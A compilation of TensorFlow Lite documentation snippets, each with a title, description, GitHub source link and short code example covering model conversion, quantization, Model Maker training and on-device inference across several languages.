DESCRIPTION: This Kotlin function invokes the BertQuestionAnswerer with the provided context and question. It measures the time taken for the inference and passes the results and inference time to an associated listener.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_9

LANGUAGE: kotlin
CODE:
```
fun answer(contextOfQuestion: String, question: String) {
    if (bertQuestionAnswerer == null) {
        setupBertQuestionAnswerer()
    }

    var inferenceTime = SystemClock.uptimeMillis()

    val answers = bertQuestionAnswerer?.answer(contextOfQuestion, question)
    inferenceTime = SystemClock.uptimeMillis() - inferenceTime
    answererListener?.onResults(answers, inferenceTime)
}
```

----------------------------------------

TITLE: Creating Image Classifier Model with Data Loading - Python TensorFlow
DESCRIPTION: Defines a class method to create and train an image classification model by loading training data and optionally validation data. It supports various hyperparameters for configuration, including model specification, batch size, epochs, learning rate, and data augmentation. Returns a configured and potentially trained ImageClassifier instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ImageClassifier.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
create(
    train_data,
    model_spec='efficientnet_lite0',
    validation_data=None,
    batch_size=None,
    epochs=None,
    steps_per_epoch=None,
    train_whole_model=None,
    dropout_rate=None,
    learning_rate=None,
    momentum=None,
    shuffle=False,
    use_augmentation=False,
    use_hub_library=True,
    warmup_steps=None,
    model_dir=None,
    do_train=True
)
```

----------------------------------------

TITLE: Adding TFLite Acceleration Service Dependency (Gradle)
DESCRIPTION: Specifies the dependency to add to your Android application's build.gradle file to include the TensorFlow Lite Acceleration Service library from Google Play Services. This is the required first step to using the API and requires a project using Gradle.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/acceleration_service.md#_snippet_0

LANGUAGE: Groovy
CODE:
```
implementation  "com.google.android.gms:play-services-tflite-
acceleration-service:16.0.0-beta01"
```

----------------------------------------

TITLE: Applying Full Integer Quantization (Float Fallback, Python)
DESCRIPTION: This snippet performs full integer quantization by setting the `optimizations` to `DEFAULT` and providing a `representative_dataset` function. The converter uses the dataset to calibrate the ranges of activation tensors. Operators that do not have an integer implementation in TFLite will remain as float operators, ensuring conversion completes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quantization.md#_snippet_4

LANGUAGE: Python
CODE:
```
import tensorflow as tf
converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir)
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter.representative_dataset = representative_dataset
tflite_quant_model = converter.convert()
```

----------------------------------------

TITLE: Initializing Generated Wrapper with Options (Java)
DESCRIPTION: Shows how to initialize the generated TensorFlow Lite model wrapper with optional parameters for acceleration, specifically demonstrating how to specify a `Model.Device` (like NNAPI) and the desired number of threads to use for model inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/codegen.md#_snippet_9

LANGUAGE: Java
CODE:
```
try {
    myImageClassifier = new MyClassifierModel(this, Model.Device.NNAPI, 3);
} catch (IOException io){
    // Error reading the model
}
```

----------------------------------------

TITLE: Running Audio Classification Inference in iOS Swift
DESCRIPTION: This Swift snippet initializes the AudioClassifier, creates an input TFLAudioTensor and TFLAudioRecord, requests microphone permissions using AVAudioSession, starts recording, loads recorded audio into the tensor, and performs classification. It requires the TensorFlowLiteTaskAudio pod dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/audio_classifier.md#_snippet_3

LANGUAGE: Swift
CODE:
```
// Imports
import TensorFlowLiteTaskAudio
import AVFoundation

// Initialization
guard let modelPath = Bundle.main.path(forResource: "sound_classification",
                                            ofType: "tflite") else { return }

let options = AudioClassifierOptions(modelPath: modelPath)

// Configure any additional options:
// options.classificationOptions.maxResults = 3

let classifier = try AudioClassifier.classifier(options: options)

// Create Audio Tensor to hold the input audio samples which are to be classified.
// Created Audio Tensor has audio format matching the requirements of the audio classifier.
// For more details, please see:
// https://github.com/tensorflow/tflite-support/blob/master/tensorflow_lite_support/ios/task/audio/core/audio_tensor/sources/TFLAudioTensor.h
let audioTensor = classifier.createInputAudioTensor()

// Create Audio Record to record the incoming audio samples from the on-device microphone.
// Created Audio Record has audio format matching the requirements of the audio classifier.
// For more details, please see:
https://github.com/tensorflow/tflite-support/blob/master/tensorflow_lite_support/ios/task/audio/core/audio_record/sources/TFLAudioRecord.h
let audioRecord = try classifier.createAudioRecord()

// Request record permissions from AVAudioSession before invoking audioRecord.startRecording().
AVAudioSession.sharedInstance().requestRecordPermission { granted in
    if granted {
        DispatchQueue.main.async {
            // Start recording the incoming audio samples from the on-device microphone.
            try audioRecord.startRecording()

            // Load the samples currently held by the audio record buffer into the audio tensor.
            try audioTensor.load(audioRecord: audioRecord)

            // Run inference
            let classificationResult = try classifier.classify(audioTensor: audioTensor)
        }
    }
}
```

----------------------------------------

TITLE: Importing TensorFlow Library - Python
DESCRIPTION: Imports the necessary TensorFlow library to define, save, and convert models, as well as to use the TensorFlow Lite interpreter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/signatures.ipynb#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
```

----------------------------------------

TITLE: Running Object Detection Inference (Kotlin)
DESCRIPTION: Executes the object detection inference by calling the `detect` method of the initialized `objectDetector` instance, passing the preprocessed `tensorImage`. The TensorFlow Lite model processes the image data and returns a list of detected objects (`results`). Requires an initialized `ObjectDetector` and a valid `TensorImage`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_12

LANGUAGE: Kotlin
CODE:
```
val results = objectDetector?.detect(tensorImage)
```

----------------------------------------

TITLE: Setting up Environment TensorFlow Python
DESCRIPTION: Imports required libraries like TensorFlow and NumPy and sets logging level. It also prints the installed TensorFlow version, verifying the environment setup for the tutorial, specifically requiring TensorFlow 2.3+.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
import logging
logging.getLogger("tensorflow").setLevel(logging.DEBUG)

import tensorflow as tf
import numpy as np
print("TensorFlow version: ", tf.__version__)
```

----------------------------------------

TITLE: Getting TFLite Output Tensor Index by Name Java
DESCRIPTION: Retrieves the numerical index for a TensorFlow Lite model's output tensor based on its operation name. This utility helps in programmatically accessing outputs when not using signatures. Throws `IllegalArgumentException` if the name is invalid.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_6

LANGUAGE: Java
CODE:
```
public int getOutputIndex(String opName);
```

----------------------------------------

TITLE: Creating Image Classifier with Custom Epochs - Python
DESCRIPTION: Creates and trains an image classification model using the specified training and validation data, overriding the default number of training epochs to 10. This allows training for a longer duration to potentially improve accuracy, or shorter to speed up training. Requires training data, validation data, and the desired number of epochs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_22

LANGUAGE: python
CODE:
```
model = image_classifier.create(train_data, validation_data=validation_data, epochs=10)
```

----------------------------------------

TITLE: Run Custom Training Loop - TensorFlow Python
DESCRIPTION: Executes the training process for the RNN model over a specified number of epochs. It iterates through the dataset in batches, calling the `train_step` function for each batch. The model's state is reset at the beginning of each epoch, and training progress (batch loss and epoch loss/time) is printed periodically. Requires a `dataset`, the `train_step` function, and defined `model`, `BATCH_SIZE`, and `EPOCHS` variables.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_33

LANGUAGE: python
CODE:
```
# Training step
EPOCHS = 10

model.create_state(BATCH_SIZE)

for epoch in range(EPOCHS):
  start = time.time()

  # initializing the hidden state at the start of every epoch
  model.reset_state()

  for (batch_n, (inp, target)) in enumerate(dataset):
    loss = train_step(inp, target)

    if batch_n % 100 == 0:
      template = 'Epoch {} Batch {} Loss {}'
      print(template.format(epoch+1, batch_n, loss))

  print ('Epoch {} Loss {}'.format(epoch+1, loss))
  print ('Time taken for 1 epoch {} sec\n'.format(time.time() - start))
```

----------------------------------------

TITLE: Run Inference and Display Results - Python
DESCRIPTION: This snippet runs object detection inference on an image using a pre-trained model and then displays the resulting image with detections drawn on it. It assumes `run_odt_and_draw_results` and `Image.fromarray` functions/methods are available from previous steps or libraries.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
detection_result_image = run_odt_and_draw_results(
    TEMP_FILE,
    interpreter,
    threshold=DETECTION_THRESHOLD
)

# Show the detection result
Image.fromarray(detection_result_image)
```

----------------------------------------

TITLE: Running TFLite Code Generator (Shell)
DESCRIPTION: Command to invoke the TensorFlow Lite code generator tool, specifying the input model file path, package name for the generated code, the desired class name for the model wrapper, and the destination directory for the generated files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/codegen.md#_snippet_4

LANGUAGE: Shell
CODE:
```
tflite_codegen --model=./model_with_metadata/mobilenet_v1_0.75_160_quantized.tflite \
    --package_name=org.tensorflow.lite.classify \
    --model_class_name=MyClassifierModel \
    --destination=./classify_wrapper
```

----------------------------------------

TITLE: Running TFLite Weight Quantization using tflite_convert (Shell)
DESCRIPTION: This snippet demonstrates the recommended way to apply post-training weight quantization to a TFLite model using the `tflite_convert` command-line tool. It specifies the output file, the input SavedModel directory, and enables the quantization transformation using the `--post_training_quantize` flag.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/optimize/g3doc/quantize_weights.md#_snippet_0

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --output_file=/tmp/foo.tflite \
  --saved_model_dir=/tmp/saved_model \
  --post_training_quantize
```

----------------------------------------

TITLE: Tune Training Hyperparameters - Python (Model Maker)
DESCRIPTION: This snippet shows how to train the object detection model using the `object_detector.create` function from Model Maker. It allows overriding default training hyperparameters like `epochs` and `batch_size` for fine-tuning the training process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_17

LANGUAGE: python
CODE:
```
model = object_detector.create(train_data, model_spec=spec, epochs=10, validation_data=validation_data)
```

----------------------------------------

TITLE: Installing Dependencies Python
DESCRIPTION: Installs or upgrades the necessary Python packages, TensorFlow and TensorFlow Datasets, using pip. This is a prerequisite step to ensure all required libraries are available for running the subsequent code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/autoclustering_xla.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
!pip install -U -q tensorflow tensorflow_datasets
```

----------------------------------------

TITLE: Initializing and Running Object Detection Swift
DESCRIPTION: Shows the steps to initialize the `ObjectDetector` using a model file path found in the app bundle and run inference on an `MLImage` object derived from a `UIImage`. It includes error handling for file loading.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/object_detector.md#_snippet_3

LANGUAGE: swift
CODE:
```
// Imports
import TensorFlowLiteTaskVision

// Initialization
guard let modelPath = Bundle.main.path(forResource: "ssd_mobilenet_v1",
                                            ofType: "tflite") else { return }

let options = ObjectDetectorOptions(modelPath: modelPath)

// Configure any additional options:
// options.classificationOptions.maxResults = 3

let detector = try ObjectDetector.detector(options: options)

// Convert the input image to MLImage.
// There are other sources for MLImage. For more details, please see:
// https://developers.google.com/ml-kit/reference/ios/mlimage/api/reference/Classes/GMLImage
guard let image = UIImage (named: "cats_and_dogs.jpg"), let mlImage = MLImage(image: image) else { return }

// Run inference
let detectionResult = try detector.detect(mlImage: mlImage)
```

----------------------------------------

TITLE: Install TFLite Support Library (Shell)
DESCRIPTION: This command installs the required TensorFlow Lite Support Python package using pip. This library provides the necessary tools and APIs, including the Metadata Writer, for working with TFLite models and metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_1

LANGUAGE: shell
CODE:
```
!pip install tflite-support-nightly
```

----------------------------------------

TITLE: Install TensorFlow Lite Support Tooling (Shell)
DESCRIPTION: This command installs the required Python package 'tflite-support' which provides the necessary tools and APIs for adding, visualizing, and reading metadata from TensorFlow Lite models. It's a prerequisite for working with TFLite metadata using the Python library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_0

LANGUAGE: Shell
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Generating Batched TensorFlow Dataset (Python)
DESCRIPTION: Produces a shared and batched `tf.data.Dataset` configured for model consumption. Key parameters include `batch_size`, `is_training` (controls shuffling/repetition), `shuffle`, `input_pipeline_context` for distributed training, and an optional `preprocess` function for on-the-fly data transformations. The `drop_remainder` flag handles incomplete final batches.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/DataLoader.md#_snippet_2

LANGUAGE: Python
CODE:
```
gen_dataset(
    batch_size=1,
    is_training=False,
    shuffle=False,
    input_pipeline_context=None,
    preprocess=None,
    drop_remainder=False
)
```

----------------------------------------

TITLE: Creating Image Classifier Simple Example Python
DESCRIPTION: Creates an image classifier model using image_classifier.create based on the provided training data. By default, it uses EfficientNet-Lite0 as the base model and performs transfer learning.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
model = image_classifier.create(train_data)
```

----------------------------------------

TITLE: Convert and Quantize GPT-2 Model to TFLite (Python)
DESCRIPTION: This snippet demonstrates how to convert a TensorFlow GPT-2 language model to TensorFlow Lite using post-training dynamic range quantization. It configures the converter to use default optimizations, enable built-in and selected TensorFlow operations, allow custom ops, and then converts the concrete function to a TFLite model, finally running inference on the quantized model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/auto_complete/overview.md#_snippet_4

LANGUAGE: Python
CODE:
```
gpt2_lm.jit_compile = False
converter = tf.lite.TFLiteConverter.from_concrete_functions(
    [concrete_func],
    gpt2_lm)

converter.target_spec.supported_ops = [
    tf.lite.OpsSet.TFLITE_BUILTINS, # enable TFLite ops
    tf.lite.OpsSet.SELECT_TF_OPS, # enable TF ops
]
converter.allow_custom_ops = True
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter.target_spec.experimental_select_user_tf_ops = [
    "UnsortedSegmentJoin",
    "UpperBound"
]
converter._experimental_guarantee_all_funcs_one_use = True
quant_generate_tflite = converter.convert()
run_inference("I'm enjoying a", quant_generate_tflite)
```

----------------------------------------

TITLE: Initializing TensorFlow Mirrored Distribution Strategy
DESCRIPTION: Retrieves the list of configured logical GPU devices and initializes a `tf.distribute.MirroredStrategy`. This strategy replicates variables and computation across the specified devices, enabling distributed execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Keras_and_Distribution_Strategy.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
# Initialize the strategy
gpus = tf.config.list_logical_devices("GPU")
print("Using following GPUs", gpus)

strategy = tf.distribute.MirroredStrategy(gpus)
```

----------------------------------------

TITLE: Downloading TensorFlow Inception Model Archive Bash
DESCRIPTION: This command downloads the compressed Inception v3 model archive from a Google Storage URL using curl and extracts it into the specified data directory using tar. This is a necessary prerequisite before building or running the demo as the model file is not included in the repository. Requires curl and tar utilities.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/label_image/README.md#_snippet_0

LANGUAGE: bash
CODE:
```
curl -L "https://storage.googleapis.com/download.tensorflow.org/models/inception_v3_2016_08_28_frozen.pb.tar.gz" |\
  tar -C tensorflow/examples/label_image/data -xz
```

----------------------------------------

TITLE: Initializing BaseOptions TensorFlow Lite Python
DESCRIPTION: This snippet shows the constructor signature for the `BaseOptions` class. It allows specifying the model file path (`file_name`), file content (`file_content`), number of inference threads (`num_threads`), and whether to use a Coral TPU (`use_coral`). It's used to configure core options for TFLite Task APIs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/core/BaseOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.core.BaseOptions(
    file_name: Optional[str] = None,
    file_content: Optional[bytes] = None,
    num_threads: Optional[int] = -1,
    use_coral: Optional[bool] = None
)
```

----------------------------------------

TITLE: Define and Compile Keras Sequential LSTM Model
DESCRIPTION: Defines a Keras Sequential model with an Input layer, an LSTM layer, a Flatten layer, and a Dense output layer with softmax activation for MNIST classification. The model is compiled using the Adam optimizer and sparse categorical crossentropy loss, suitable for integer-labeled classes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/keras_lstm.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
model = tf.keras.models.Sequential([
    tf.keras.layers.Input(shape=(28, 28), name='input'),
    tf.keras.layers.LSTM(20),
    tf.keras.layers.Flatten(),
    tf.keras.layers.Dense(10, activation=tf.nn.softmax, name='output')
])
model.compile(optimizer='adam',
              loss='sparse_categorical_crossentropy',
              metrics=['accuracy'])
model.summary()
```

----------------------------------------

TITLE: Run Audio Inference TFLite Python
DESCRIPTION: Demonstrates how to perform inference on an audio sample using a TensorFlow Lite model in Python. It loads the TFLite interpreter, prepares an audio sample (loading, resampling, padding/truncating to fit the model input size), runs the inference, and prints the top prediction class and score along with showing the source audio.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_20

LANGUAGE: python
CODE:
```
# Get a WAV file for inference and list of labels from the model
tflite_file = os.path.join(SAVE_PATH, TFLITE_FILENAME)
labels = get_labels(tflite_file)
random_audio = get_random_audio_file(test_dir)

# Ensure the audio sample fits the model input
interpreter = tf.lite.Interpreter(tflite_file)
input_details = interpreter.get_input_details()
output_details = interpreter.get_output_details()
input_size = input_details[0]['shape'][1]
sample_rate = get_input_sample_rate(tflite_file)
audio_data, _ = librosa.load(random_audio, sr=sample_rate)
if len(audio_data) < input_size:
  audio_data.resize(input_size)
audio_data = np.expand_dims(audio_data[:input_size], axis=0)

# Run inference
interpreter.allocate_tensors()
interpreter.set_tensor(input_details[0]['index'], audio_data)
interpreter.invoke()
output_data = interpreter.get_tensor(output_details[0]['index'])

# Display prediction and ground truth
top_index = np.argmax(output_data[0])
label = labels[top_index]
score = output_data[0][top_index]
print('---prediction---')
print(f'Class: {label}\nScore: {score}')
print('----truth----')
show_sample(random_audio)
```

----------------------------------------

TITLE: Configuring Task API ObjectDetector Options Conditionally (Java)
DESCRIPTION: This snippet demonstrates how to use the result of the GPU availability check task (`useGpuTask`) within a `.continueWith` callback to build `ObjectDetectorOptions`. It enables GPU support if the device is compatible.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_15

LANGUAGE: Java
CODE:
```
Task<ObjectDetectorOptions> optionsTask = useGpuTask.continueWith({ task ->
  BaseOptions baseOptionsBuilder = BaseOptions.builder();
  if (task.getResult()) {
    baseOptionsBuilder.useGpu();
  }
  return ObjectDetectorOptions.builder()
          .setBaseOptions(baseOptionsBuilder.build())
          .setMaxResults(1)
          .build()
});
```

----------------------------------------

TITLE: Initializing and Running Inference C++ TextEmbedder
DESCRIPTION: This snippet demonstrates how to initialize the TextEmbedder in C++ from a model file, embed two input text strings to obtain feature vectors, and compute the cosine similarity between the resulting embeddings using the API's built-in utility function. It requires a valid TensorFlow Lite text embedder model file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/text_embedder.md#_snippet_0

LANGUAGE: c++
CODE:
```
// Initialization.
TextEmbedderOptions options:
options.mutable_base_options()->mutable_model_file()->set_file_name(model_path);
std::unique_ptr<TextEmbedder> text_embedder = TextEmbedder::CreateFromOptions(options).value();

// Run inference with your two inputs, `input_text1` and `input_text2`.
const EmbeddingResult result_1 = text_embedder->Embed(input_text1);
const EmbeddingResult result_2 = text_embedder->Embed(input_text2);

// Compute cosine similarity.
double similarity = TextEmbedder::CosineSimilarity(
    result_1.embeddings[0].feature_vector()
    result_2.embeddings[0].feature_vector());
```

----------------------------------------

TITLE: Creating TFLite GPU Delegate with Serialization Java
DESCRIPTION: This Java snippet demonstrates how to create a `GpuDelegate` configured for serialization. It uses `GpuDelegate.Options().setSerializationParams()` to specify the serialization directory (`serializationDir`) and a unique model token (`modelToken`). The created delegate is then added to the `Interpreter.Options`, which are used when initializing the TensorFlow Lite interpreter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/gpu.md#_snippet_1

LANGUAGE: Java
CODE:
```
    GpuDelegate delegate = new GpuDelegate(
      new GpuDelegate.Options().setSerializationParams(
        /* serializationDir= */ serializationDir,
        /* modelToken= */ modelToken));

    Interpreter.Options options = (new Interpreter.Options()).addDelegate(delegate);
```

----------------------------------------

TITLE: Adding TensorFlow Lite Text Task Dependency - Gradle
DESCRIPTION: Adds the necessary TensorFlow Lite Task Library for text classification to the module's `build.gradle` file. This library provides pre-built APIs for common text tasks, simplifying model integration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_2

LANGUAGE: Gradle
CODE:
```
dependencies {
  ...
  implementation 'org.tensorflow:tensorflow-lite-task-text:0.4.0'
}
```

----------------------------------------

TITLE: Exporting TFLite Model with Metadata - Python
DESCRIPTION: Exports the trained image classification model to the TensorFlow Lite format, including metadata like labels and vocabulary files, into the specified directory. The default output filename is 'model.tflite'. Requires a trained model object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
model.export(export_dir='.')
```

----------------------------------------

TITLE: Creating Text Classification Model (Python)
DESCRIPTION: Class method to load training data, optionally validation data, and train a text classification model. It allows specifying model architecture, batch size, epochs, shuffling, and whether to perform training. Returns a TextClassifier instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/TextClassifier.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create(
    train_data,
    model_spec='average_word_vec',
    validation_data=None,
    batch_size=None,
    epochs=3,
    steps_per_epoch=None,
    shuffle=False,
    do_train=True
)
```

----------------------------------------

TITLE: Deserializing TFLite Flatbuffer File to Interpreter (C++)
DESCRIPTION: Demonstrates the standard method for loading a TFLite flatbuffer model from a file and building an `Interpreter` from it. Uses `FlatBufferModel::BuildFromFile` to load the model, `BuiltinOpResolver` to handle standard operations, and `InterpreterBuilder` to construct the interpreter instance. Requires the path to the flatbuffer file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/serialization/README.md#_snippet_3

LANGUAGE: C++
CODE:
```
std::unique_ptr<FlatBufferModel> model =
    FlatBufferModel::BuildFromFile(filename);
tflite::ops::builtin::BuiltinOpResolver resolver;
InterpreterBuilder builder(*model, resolver);
std::unique_ptr<Interpreter> new_interpreter;
builder(&new_interpreter);
```

----------------------------------------

TITLE: Create TfLiteInitializationOptions with GPU Support - Kotlin
DESCRIPTION: Creates an instance of `TfLiteInitializationOptions.Builder` and configures it to enable GPU delegate support for TensorFlow Lite execution via Google Play services. This is a prerequisite for using GPU acceleration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_3

LANGUAGE: Kotlin
CODE:
```
val options = TfLiteInitializationOptions.builder()
    .setEnableGpuDelegateSupport(true)
    .build()
```

----------------------------------------

TITLE: Implementing Training and Evaluation Steps (Python)
DESCRIPTION: Provides helper functions for the training and evaluation process. `forward` computes the model output and cross-entropy loss. `compute_gradients` calculates gradients using `tf.GradientTape`. `compute_sgd_updates` determines parameter updates based on SGD. `apply_updates` applies these updates to the model parameters. `evaluate` calculates the classification accuracy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_Numpy_Distributed_Image_Classification.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
def forward(model, inputs, labels):
  """Computes prediction and loss."""
  logits = model(inputs)
  # TensorFlow's loss function has numerically stable implementation of forward
  # pass and gradients. So we prefer that here.
  loss = tf.nn.softmax_cross_entropy_with_logits(labels, logits)
  mean_loss = tnp.mean(loss)
  return logits, mean_loss

def compute_gradients(model, inputs, labels):
  """Computes gradients of loss based on `labels` and prediction on `inputs`."""
  with tf.GradientTape() as tape:
    tape.watch(inputs)
    _, loss = forward(model, inputs, labels)
  gradients = tape.gradient(loss, model.params)
  return gradients

def compute_sgd_updates(gradients, learning_rate):
  """Computes parameter updates based on SGD update rule."""
  return [-learning_rate * grad for grad in gradients]

def apply_updates(model, updates):
  """Applies `update` to `model.params`."""
  for param, update in zip(model.params, updates):
    param.assign_add(update)

def evaluate(model, images, labels):
  """Evaluates accuracy for `model`'s predictions."""
  prediction = model(images)
  predicted_class = tnp.argmax(prediction, axis=-1)
  actual_class = tnp.argmax(labels, axis=-1)
  return float(tnp.mean(predicted_class == actual_class))
```

----------------------------------------

TITLE: Configuring Task API ObjectDetector with BaseOptions (Java)
DESCRIPTION: Set the GPU-enabled `BaseOptions` within the configuration for a Task API model, like `ObjectDetectorOptions`, to ensure it uses the GPU delegate.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_24

LANGUAGE: Java
CODE:
```
ObjectDetectorOptions options =
            ObjectDetectorOptions.builder()
                .setBaseOptions(baseOptions)
                .setMaxResults(1)
                .build();
```

----------------------------------------

TITLE: Initializing TFLite with Play Services and GPU Support (Java)
DESCRIPTION: This snippet demonstrates how to asynchronously initialize the TensorFlow Lite runtime using Google Play Services. It first checks if the GPU delegate is available on the device using `TfLiteGpu.isGpuDelegateAvailable` and then uses the result to configure `TfLiteInitializationOptions`, enabling GPU delegate support if available before calling `TfLite.initialize`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/acceleration_service.md#_snippet_6

LANGUAGE: Java
CODE:
```
TfLiteGpu.isGpuDelegateAvailable(context)
   .onSuccessTask(gpuAvailable -> TfLite.initialize(context,
      TfLiteInitializationOptions.builder()
        .setEnableGpuDelegateSupport(gpuAvailable)
        .build()
      )
   );
```

----------------------------------------

TITLE: Loading Pose Landmarks Dataset - Python
DESCRIPTION: Loads preprocessed CSV containing pose landmarks, scores, and labels. It processes the data by dropping unnecessary columns, extracting class names and numerical labels, and converting feature data to float64 and labels to a one-hot encoded format suitable for training deep learning models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_12

LANGUAGE: python
CODE:
```
def load_pose_landmarks(csv_path):
  """Loads a CSV created by MoveNetPreprocessor.
  
  Returns:
    X: Detected landmark coordinates and scores of shape (N, 17 * 3)
    y: Ground truth labels of shape (N, label_count)
    classes: The list of all class names found in the dataset
    dataframe: The CSV loaded as a Pandas dataframe features (X) and ground
      truth labels (y) to use later to train a pose classification model.
  """

  # Load the CSV file
  dataframe = pd.read_csv(csv_path)
  df_to_process = dataframe.copy()

  # Drop the file_name columns as you don't need it during training.
  df_to_process.drop(columns=['file_name'], inplace=True)

  # Extract the list of class names
  classes = df_to_process.pop('class_name').unique()

  # Extract the labels
  y = df_to_process.pop('class_no')

  # Convert the input features and labels into the correct format for training.
  X = df_to_process.astype('float64')
  y = keras.utils.to_categorical(y)

  return X, y, classes, dataframe
```

----------------------------------------

TITLE: Creating Interpreter API Options with GPU Delegate Factory (Java)
DESCRIPTION: Define the options for the TFLite Interpreter API, configuring the runtime and incorporating the `GpuDelegateFactory` to direct inference operations to the GPU.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_28

LANGUAGE: Java
CODE:
```
Options interpreterOption = InterpreterApi.Options()
          .setRuntime(TfLiteRuntime.FROM_SYSTEM_ONLY)
          .addDelegateFactory(new GpuDelegateFactory());
```

----------------------------------------

TITLE: Using Generated TFLite Model Wrapper (Java)
DESCRIPTION: Demonstrates how to initialize the generated TensorFlow Lite model wrapper class (e.g., `MyClassifierModel`), create input objects (like loading a Bitmap), run inference, and retrieve the model outputs (e.g., a map of labeled probabilities). Requires the generated wrapper module dependency and handling `IOException` during initialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/codegen.md#_snippet_8

LANGUAGE: Java
CODE:
```
// 1. Initialize the model
MyClassifierModel myImageClassifier = null;

try {
    myImageClassifier = new MyClassifierModel(this);
} catch (IOException io){
    // Error reading the model
}

if(null != myImageClassifier) {

    // 2. Set the input with a Bitmap called inputBitmap
    MyClassifierModel.Inputs inputs = myImageClassifier.createInputs();
    inputs.loadImage(inputBitmap));

    // 3. Run the model
    MyClassifierModel.Outputs outputs = myImageClassifier.run(inputs);

    // 4. Retrieve the result
    Map<String, Float> labeledProbability = outputs.getProbability();
}
```

----------------------------------------

TITLE: Initialize and Run Image Searcher Java
